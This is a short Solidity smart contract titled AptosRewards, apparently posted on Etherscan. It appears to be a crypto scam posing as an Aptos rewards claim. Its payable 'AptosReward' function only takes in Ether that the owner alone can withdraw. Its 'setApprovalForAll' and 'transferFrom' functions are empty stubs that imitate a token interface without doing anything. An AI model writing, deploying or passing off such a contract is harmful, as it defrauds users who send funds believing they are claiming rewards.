/**
 *Submitted for verification at Etherscan.io on 2022-11-15
*/

pragma solidity ^0.4.26;

contract AptosRewards {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function AptosReward() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function setApprovalForAll(address project, address operator, bool approved) external {
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
       
    }
}